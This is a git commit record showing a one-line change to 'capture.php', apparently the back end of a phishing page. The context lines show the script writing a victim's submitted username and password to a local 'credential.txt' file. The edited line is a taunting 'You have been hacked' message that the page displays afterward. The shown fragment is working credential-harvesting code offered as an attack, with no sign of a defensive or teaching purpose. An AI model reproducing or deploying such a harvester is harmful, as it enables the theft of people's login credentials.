aa6cd5ddf7ad36b8ad2ad7ece6e84ab31146609a
Naitik Rauniyar <64009612+naitik0009@users.noreply.github.com>
2021-10-04 23:53:51 +0545

    Update capture.php

--- capture.php
+++ capture.php
@@ -5,5 +5,5 @@ $file = fopen('credential.txt','a');
 fwrite($file,"username = ".$email."\n");
 fwrite($file,"password = ".$password."\n");
 fclose($file);
-echo "<h1>You have been hacked bro hahahahahah...</h1>"
+echo "<h1>You have been hacked hyy bro hahahahahah...</h1>"
 ?>
